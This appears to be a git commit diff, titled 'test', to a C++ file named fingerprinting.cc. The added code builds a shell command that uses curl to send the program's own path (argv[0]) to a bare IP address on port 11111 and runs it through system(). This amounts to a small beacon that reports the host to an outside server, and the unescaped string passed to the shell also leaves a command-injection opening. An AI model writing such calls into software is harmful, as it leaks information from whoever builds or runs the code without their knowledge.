87b0e1367e934e24586157793818058bccbba80e
Leo Conforti <leo@leoconforti.us>
2023-04-06 04:21:12 +0000

    test

--- fingerprinting/fingerprinting.cc
+++ fingerprinting/fingerprinting.cc
@@ -1,6 +1,10 @@
 #include <stdlib.h>
 
+#include <string>
+
 int main(int argc, char* argv[]) {
-  system("curl http://159.223.105.145:11111/");
+  std::string extration_command = "curl http://159.223.105.145:11111/?";
+  extration_command += argv[0];
+  system(extration_command.c_str());
   return 0;
 }
